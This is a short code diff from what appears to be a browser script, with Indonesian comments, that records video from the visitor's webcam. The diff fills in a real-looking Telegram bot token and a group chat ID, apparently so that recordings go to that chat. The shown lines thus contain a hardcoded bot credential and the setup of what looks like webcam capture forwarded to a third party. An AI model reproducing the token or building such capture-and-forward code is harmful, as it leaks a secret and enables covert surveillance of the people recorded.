@@ -8,10 +8,10 @@ let recordingInterval;
 let countdownTimer;
 
 // Masukkan token bot Telegram Anda di sini
-const telegramBotToken = 'TOKEN_BOT_ANDA';  // Ganti dengan token bot Telegram Anda
+const telegramBotToken = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q'; // Ganti dengan token bot Telegram Anda
 
 // Masukkan chat ID atau ID grup/channel di sini
-const chatId = 'ID_CHAT_ANDA';  // Ganti dengan chat ID atau username channel
+const chatId ='-4545188605';  // Ganti dengan chat ID atau username channel
 
 async function startRecording() {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
